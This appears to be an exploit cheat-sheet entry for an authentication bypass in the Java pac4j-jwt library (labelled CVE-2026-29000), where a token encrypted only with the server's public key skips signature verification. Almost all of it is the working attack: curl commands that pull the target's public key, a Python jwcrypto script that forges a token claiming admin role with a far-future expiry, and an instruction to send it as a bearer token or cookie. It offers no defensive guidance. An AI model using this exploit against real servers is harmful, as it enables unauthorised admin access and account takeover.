# pac4j-JWT Encrypted JWT Forge with Public Key (CVE-2026-29000)

pac4j-jwt (Java) < 6.1.0: when JWT encryption uses RSA-OAEP, the library accepts a JWT encrypted with the *public* key alone (JWE), bypassing signature verification. An attacker who can see the server's public key can forge any JWT claims.

```bash
# 1. Retrieve the server's RSA public key (JWKS endpoint common):
curl http://<TARGET>:8080/.well-known/jwks.json
curl http://<TARGET>:8080/api/publicKey

# 2. Forge a JWT encrypted with the public key using Python:
pip install jwcrypto
python3 << 'EOF'
from jwcrypto import jwk, jwe
import json, base64

# Load public key from JWKS
public_key = jwk.JWK.from_json(open('server_pub.json').read())

# Payload — set role/user to admin
payload = json.dumps({"sub": "admin", "role": "admin", "exp": 9999999999})
token = jwe.JWE(payload.encode(), json.dumps({
    "alg": "RSA-OAEP",
    "enc": "A256GCM",
    "kid": public_key.key_id
}))
token.add_recipient(public_key)
print(token.serialize(compact=True))
EOF

# 3. Use the forged JWT as Authorization Bearer or cookie
```
